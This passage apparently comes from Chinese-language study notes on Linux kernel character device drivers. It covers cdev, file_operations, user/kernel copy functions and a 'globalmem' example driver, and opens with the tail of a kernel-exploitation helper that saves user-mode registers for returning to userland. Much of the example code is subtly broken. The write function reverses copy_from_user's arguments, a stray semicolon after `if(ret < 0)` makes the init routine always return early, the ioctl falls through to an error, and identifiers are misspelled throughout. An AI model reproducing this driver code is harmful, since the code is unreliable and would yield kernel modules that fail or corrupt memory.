%%rsp, %3\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">    :</span><br><span class="line">    : <span class="string">&quot;memory&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里说一下，<code>pushf</code>里的<code>f</code>代表的<code>flag</code>,标志位寄存器。所以pushf作用是将标志位寄存器压入栈中。</p>
<p>关于为什么我们要回到用户空间？</p>
<ul>
<li>Most useful things we want to do are much easier from userland.</li>
<li>In KernelSpace, there’s no easy way to:<ul>
<li>Modify the filesystem</li>
<li>Create a new process</li>
<li>Create network connections</li>
</ul>
</li>
</ul>
<h3 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h3><p>字符设备典型的就是terminal</p>
<p>与之相对应的还有</p>
<ul>
<li>块设备(硬盘)</li>
<li>网络设备(网卡)</li>
</ul>
<h3 id="驱动相关函数和结构体"><a href="#驱动相关函数和结构体" class="headerlink" title="驱动相关函数和结构体"></a>驱动相关函数和结构体</h3><p>linux字符设备驱动结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cdev结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>          <span class="comment">//内嵌的kobject对象</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>		  <span class="comment">//所属模块</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span>  <span class="comment">//文件操作结构体</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">dev_t</span> dev;					  <span class="comment">//设备号</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>cdev结构体的dev_t定义了设备号，32位(12位为主设备号，20位为次设备号)</p>
<p>使用宏获得主次设备号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="type">dev_t</span> dev)</span><br><span class="line">MINOR(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure>

<p>cdev结构体的<u>file_operation</u>指针定义字符设备驱动提供给悉尼文件系统的<u>接口</u>函数</p>
<p>linux内核提供了一组函数用以操作cdev结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_oprations *)</span>;<span class="comment">//用于初始化cdev的成员，并建立cdev和file_operation之间的连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">//动态申请一个cdev内存</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span> <span class="type">unsigned</span>)</span>;	<span class="comment">//将设备添加到系统，使用分配好的设备号和已初始化的设备结构</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span>;	<span class="comment">//和cdev_add()对应</span></span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="keyword">struct</span> file_operation *fops)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(cdev，<span class="number">0</span>，<span class="keyword">sizeof</span> *cdev);</span><br><span class="line">	INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">	kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">	cdev-&gt;ops = fops;<span class="comment">//将传入的文件操作结构的指针赋值给cdev的ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>cdev_alloc()</code>函数用于动态申请一个cdev内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> *<span class="title">p</span> =</span> kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cdev), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span>(p)&#123;</span><br><span class="line">		INIT_LIST(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">		kobject_init(&amp;p-&gt;kobj,&amp;ktype_cdev_dynamic);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>cdev_add()</code>函数  (<em>驱动模块的加载函数中</em>)  和cdev_del()函数（驱动模块的写在函数中）分别向系统添加和删除一个cdev，完成字符设备的注册和销毁。</p>
<p>在cdev_add()函数向系统注册设备之前，应首先调用以下函数向系统申请设备号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)	<span class="comment">//分配一个可用设备号</span></span><br><span class="line">register_chrdev_region(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)	<span class="comment">//注册这个设备号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//register_chrdev_region`函数用于已知设备的设备号的情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而<code>alloc_chrdev_region</code>用于设备号未知向系统动态申请被占用的设备号的情况，函数调用成功后，会把得到的设备号放入第一个参数dev中。<code>alloc_chrdev_region()</code>相比于<code>register_chrdev_region()</code>的优点在于它会自动避开设备号重复的冲突。</p>
<p>相应的，在调用<code>cdev_del()</code>函数从系统注销字符设备之后，<code>unregister_chrdev_region()</code>应该被调用以释放原先申请的设备号。</p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void unregister_chrdev_region(dev_t from ,unsigned count)</span><br></pre></td></tr></table></figure>



<h4 id="file-operation结构体"><a href="#file-operation结构体" class="headerlink" title="file_operation结构体"></a>file_operation结构体</h4><p>file_operation结构体的成员函数是字符驱动设备程序设计的主体内容(API)，这些内容实际在应用程序进行Linux的open(),write(),read(),close()等系统调用时最终被内核调用。file_operation结构体目前已经比较庞大.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct file_operation&#123;</span><br><span class="line">	struct module *owner;</span><br><span class="line">	loff_t (*llseek) (struct file *,loff_t,int);</span><br><span class="line">	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*write) (struct file *,const char __user *,size_t, loff_t);</span><br><span class="line">	ssize_t (*aio_read) (struct kiocb *, const struct iovec *,unsigned long, loff_t);</span><br><span class="line">	ssize_t (*aio_write) (struct kiocb *, const struct iovec *,unsigned long,loff_t);</span><br><span class="line">	int (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">	unsigned int (*poll) (struct file *,struct poll_table_struct *);</span><br><span class="line">	long (*unlocked_iooctl) (struct file *,unsigned int, unsigned long);</span><br><span class="line">	long (*compat_ioctl) (struct file *,unsigned int, unsigned long);</span><br><span class="line">	int (*mmap) (struct file *，struct vm_area_struct *);</span><br><span class="line">	int (*open) (struct inode *,struct file *);</span><br><span class="line">	int (*flush) (struct file *,fl_ower_t id);</span><br><span class="line">	int (*release) (struct file *,loff_t, loff_t, int datasync);</span><br><span class="line">	int (*aio_fsync) (struct kiocb *,int dataysnc);</span><br><span class="line">	int (*fasync) (int,struct file *,int);</span><br><span class="line">	int (*lock) (struct file *, int,struct file_lock *);</span><br><span class="line">	ssize_t (*sendpage) (struct file *，struct page *,int, size_t, loff *,int);</span><br><span class="line">	unsigned long (*get_unmapped_aread) (struct file *, unsigned long, unsigned long,unsigned 						long,unsigned long);</span><br><span class="line">	int (*check_flags) (int);</span><br><span class="line">	int (*flock) (struct file *,struct file_lock *);</span><br><span class="line">	ssize_t (*spllice_write) (struct pipe_inode_info *,struct file *,loff_t *,size_t, unsigned int);</span><br><span class="line">	ssize_t (*splice_read) (struct file *，loff_t *,struct pipe_inode_info *,size_t,unsigned int);</span><br><span class="line">	int (*setlease) (struct file *file,int mode, loff_t offset, loff_t len);</span><br><span class="line">	int (*show_fdinfo) (struct seq_file *m, struct file *f);</span><br><span class="line">	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>………..</p>
<p>API函数的详细解释</p>
<p>………</p>
<p>file_operation结构体中的成员函数是字符设备驱动与内核虚拟文件系统的接口，是用户空间对Linux进行系统调用的最终的落实者。大多数字符设备会实现read(),write(),ioctl()函数</p>
<h4 id="字符设备驱动IO控制函数模板"><a href="#字符设备驱动IO控制函数模板" class="headerlink" title="字符设备驱动IO控制函数模板"></a>字符设备驱动IO控制函数模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//读设备</span><br><span class="line">ssize_t xxx_read(struct file *filp，char __user *buf,size_t count,loff_t *f_ops)</span><br><span class="line">&#123;					//文件结构体指针，用户空间内存的地址，要读的字节数，相对文件开头的偏移</span><br><span class="line">	...</span><br><span class="line">	copy_to_user(buf,...,...);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">//写设备</span><br><span class="line">ssize_t xxx_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_ops)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	copy_from_user(...,buf,...);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">//ioctl函数</span><br><span class="line">long xxx_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	switch(cmd)&#123;</span><br><span class="line">	case XXX_CMD1:</span><br><span class="line">		...</span><br><span class="line">	case XXX_CMD2：</span><br><span class="line">		...</span><br><span class="line">	default:</span><br><span class="line">	//不能支持的命令</span><br><span class="line">		return	- ENOTTY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用户空间是不能直接访问内核空间的，所以当需要数据交换时就会用到<code>copy_to_user()</code>,<code>copy_from_user()</code>其就相当于<em>门</em></p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long copy_from_user(void *to ,const void __user *from, unsigned long count);</span><br><span class="line">unsigned long copy_to_user(void __user *to ,const void  *from, unsigned long count);</span><br><span class="line">//__user 是一个宏，表明代码指向用户空间</span><br></pre></td></tr></table></figure>

<p>拓展一下，如果只是简单数据类型如<code>char</code>,<code>int</code>,<code>long</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_user(val, (int *) arg);//用户——&gt;内核</span><br><span class="line">put_user(val, (int *) arg);//内核——&gt;用户</span><br><span class="line">//copy_to_user(), put_user()自包含access_ok(),是对地址合法性的检查。</span><br><span class="line">//__put_user(),__copy_to_user()没有</span><br></pre></td></tr></table></figure>







<h3 id="globalmem虚拟设备"><a href="#globalmem虚拟设备" class="headerlink" title="globalmem虚拟设备"></a>globalmem虚拟设备</h3><h4 id="globalmem虚拟设备实列描述"><a href="#globalmem虚拟设备实列描述" class="headerlink" title="globalmem虚拟设备实列描述"></a>globalmem虚拟设备实列描述</h4><p><code>globalmem</code>是一个虚拟字符驱动设备，意味着“全局内存”，分配一片大小为GLOBALMEM_SIZE(4KB)的内存空间，并在驱动中提供针对这片内存的读写，控制和定位函数，以供用户空间进程获取和设置这片内存的内容。没有实际价值</p>
<h4 id="globalmem设备结构体和宏"><a href="#globalmem设备结构体和宏" class="headerlink" title="globalmem设备结构体和宏"></a>globalmem设备结构体和宏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;linux/module.h&gt;</span><br><span class="line">#include&lt;linux/fs.h&gt;</span><br><span class="line">#include&lt;linuc/init.h&gt;</span><br><span class="line">#include&lt;linux/cdev.h&gt;</span><br><span class="line">#include&lt;linux/uaccess.h&gt;</span><br><span class="line"></span><br><span class="line">#define GLOBALMEM_SIZE 0x1000</span><br><span class="line">#define MEM_CLEAR 0x1</span><br><span class="line">#define GLOBALMEM_MAJOR 230</span><br><span class="line"></span><br><span class="line">static int globalmem_major = GLOBALMEM_MAJOR</span><br><span class="line">module_param(globalmem_major,int,S_IRUGO);</span><br><span class="line"></span><br><span class="line">struct globalmem_dev&#123;</span><br><span class="line">	struct cdev cdev;</span><br><span class="line">	unsigned char mem[GLOBALMEM_SIZE];//定义了cdev结构体，并将其使用的内存空间一起打包</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct globalmem_dev *globalmem_devp;</span><br></pre></td></tr></table></figure>

<h4 id="加载和卸载设备驱动"><a href="#加载和卸载设备驱动" class="headerlink" title="加载和卸载设备驱动"></a>加载和卸载设备驱动</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">static void globalmem_setup_cdev(struct globalmem_dev *dev,int index)</span><br><span class="line">&#123;</span><br><span class="line">	int err, decno = MKDEV(globalmem_major,index);</span><br><span class="line">	</span><br><span class="line">	cdev_init(&amp;dev-&gt;cdev, &amp;globalmem_fops);</span><br><span class="line">	dev-&gt;cdev.owner = THISMODULE;</span><br><span class="line">	err = cdev_add(&amp;dev-&gt;cdev, devno, 1);</span><br><span class="line">	if(err)</span><br><span class="line">		printk(KERN_NOTICE &quot;Error %d adding globalmem&quot;.err .index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static int __init globalmem_init(void)</span><br><span class="line">&#123;</span><br><span class="line">	int ret;</span><br><span class="line">	dev_t devno = MKDEV(globalmem_major, 0);</span><br><span class="line">	</span><br><span class="line">	if(globalmem_major)</span><br><span class="line">		ret = register_chrdev_region(devno, 1, &quot;globalmem&quot;);</span><br><span class="line">	else&#123;</span><br><span class="line">		ret = alloc_chrdev_region(&amp;devno,o,1,&quot;globalmem&quot;);</span><br><span class="line">		globalmem_major = MAJOR(devno);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	if(ret &lt; 0);</span><br><span class="line">		return ret;</span><br><span class="line">	</span><br><span class="line">	globalmem_devp = kzalloc(sizeof(struct globalmem_dev), GFP_KERNEL);</span><br><span class="line">	if(!globalmem_devp)&#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		goto fail_malloc;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	globalmem_setup_cdev(globalmem_devp,0);</span><br><span class="line">	return 0;</span><br><span class="line">	fail_malloc:</span><br><span class="line">	unregister_chrdev_region(devno, 1);</span><br><span class="line">	return ret;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">module_init(globalm,em_init);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的文件操作结构体"><a href="#globalmem设备驱动的文件操作结构体" class="headerlink" title="globalmem设备驱动的文件操作结构体"></a>globalmem设备驱动的文件操作结构体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static const struct file_operations globalmem_fops = &#123;</span><br><span class="line">	.owner           = THIS_MODULE;</span><br><span class="line">	.llseek          = globalmem_llseek,</span><br><span class="line">	.read            = globalmem_read,</span><br><span class="line">	.write           = globalmem_write,</span><br><span class="line">    .unlocked_ioctl  = globalmem_ioctl,</span><br><span class="line">    .open            = globalmem_open,</span><br><span class="line">    .release         = gloabalmem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="globalmemq设备驱动的读函数"><a href="#globalmemq设备驱动的读函数" class="headerlink" title="globalmemq设备驱动的读函数"></a>globalmemq设备驱动的读函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t globalmem_read(struct file filp, char __suer * buf,size_t size, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long p = *ppos;</span><br><span class="line">	unsigned int count = size;</span><br><span class="line">	int ret = 0;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private_data;</span><br><span class="line">	</span><br><span class="line">	if(p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">		return 0;</span><br><span class="line">	if(count &gt; GLOBANMEM_SIZE - p)</span><br><span class="line">		count = GLOBALMEM_SIZE - p;</span><br><span class="line">		</span><br><span class="line">	if(copy_to_user(buf, dev-&gt;mem + p,count))&#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		*ppos += count;</span><br><span class="line">		ret = count;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		printk(KERN_INFO &quot;read %u byte(s) from %lu\n&quot;,count ,p);</span><br><span class="line">	&#125;</span><br><span class="line">	//ppos是相对文件开头的偏移，当大于GLOBALMEM_SIZE式返回0(EOF)</span><br><span class="line">	return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的写函数"><a href="#globalmem设备驱动的写函数" class="headerlink" title="globalmem设备驱动的写函数"></a>globalmem设备驱动的写函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t globalmem_write(struct file filp, char __suer * buf,size_t size, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long p = *ppos;</span><br><span class="line">	unsigned int count = size;</span><br><span class="line">	int ret = 0;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private_data;</span><br><span class="line">	</span><br><span class="line">	if(p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">		return 0;</span><br><span class="line">	if(count &gt; GLOBANMEM_SIZE - p)</span><br><span class="line">		count = GLOBALMEM_SIZE - p;</span><br><span class="line">		</span><br><span class="line">	if(copy_from_user(buf, dev-&gt;mem + p,count))&#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		*ppos += count;</span><br><span class="line">		ret = count;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		printk(KERN_INFO &quot;writeten %u byte(s) from %lu\n&quot;,count ,p);</span><br><span class="line">	&#125;</span><br><span class="line">	//ppos是相对文件开头的偏移，当大于GLOBALMEM_SIZE式返回0(EOF)</span><br><span class="line">	return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的IO控制函数"><a href="#globalmem设备驱动的IO控制函数" class="headerlink" title="globalmem设备驱动的IO控制函数"></a>globalmem设备驱动的IO控制函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static long globalmem_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</span><br><span class="line">&#123;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private——data;</span><br><span class="line">	switch(cmd)&#123;</span><br><span class="line">	</span><br><span class="line">	case MEM_CLEAR:</span><br><span class="line">	memset(dev-&gt;mem, 0, GLOBALMEM_SIZE);</span><br><span class="line">	printk(KERN_INFO &quot;globalmem is set to zero\n&quot;);</span><br><span class="line">	</span><br><span class="line">	default:</span><br><span class="line">		return -EINVAL;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>…</p>
<h3 id="ioctl-函数"><a href="#ioctl-函数" class="headerlink" title="ioctl()函数"></a>ioctl()函数</h3><p>…</p>
<h4 id="字符设备驱动模块加载与卸载模板函数"><a href="#字符设备驱动模块加载与卸载模板函数" class="headerlink" title="字符设备驱动模块加载与卸载模板函数"></a>字符设备驱动模块加载与卸载模板函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//设备结构体</span><br><span class="line">struct xxx_dev_t &#123;</span><br><span class="line">	struct cdev cdev;</span><br><span class="line">	...</span><br><span class="line">&#125; xxx_dev;</span><br><span class="line"></span><br><span class="line">//设备驱动模块加载函数</span><br><span class="line">static int __init xxx_init(void)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	cdev_init(&amp;xxx_dev.cdev, &amp;xxx_fops);//初始化cdev</span><br><span class="line">	xxx_dev.cdev.owner = THIS_MODULE;</span><br><span class="line">    </span><br><span class="line">   if(xxx_major)&#123;</span><br><span class="line">   		register_chrdev_region(xxx_dev_no, 1, DEV_NAME);</span><br><span class="line">   	</span><br><span class="line">   &#125;else &#123;</span><br><span class="line">   		alloc_chrdev_region(&amp;xxx_dev_no, 0 ,DEV_NAME);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   ret = cdev_add(&amp;xxx_dev.cdev,xxx_dev_no, 1);//注册设备</span><br><span class="line">   ...</span><br><span class="line">   </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> //设备驱动模块卸载函数</span><br><span class="line"> static void __exit xxx_exit(void)</span><br><span class="line"> &#123;</span><br><span class="line"> 		unregister_chrdev_region(xxx_dev_no, 1)//释放占用的设备号</span><br><span class="line"> 		cdev_del(&amp;xxx_dev.cdev);//注销设备</span><br><span class="line"> 		...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h2 id="Linux内核内存管理内核空间的动态内存申请"><a href="#Linux内核内存管理内核空间的动态内存申请" class="headerlink" title="Linux内核内存管理内核空间的动态内存申请"></a>Linux内核内存管理内核空间的动态内存申请</h2><p><code>kmalloc()</code><br><code>__get_free_page()</code><br><code>vmalloc()</code></p>
<p><code>kmalloc（）</code>和<code>__get_free_page</code>及类似函数申请的内存位于DMA和常规区域的映射区，在物理上也是连续的，他们与真实的物理地址只有一个固定的偏移，有比较简单的转换关系<code>vmalloc()</code>在虚拟内存空间给出一块连续的内存区，实质上，这片连续的内存区在物理上并不一样连续，也就没有简单的转换关系</p>
<p>kmalloc函数原型</p>
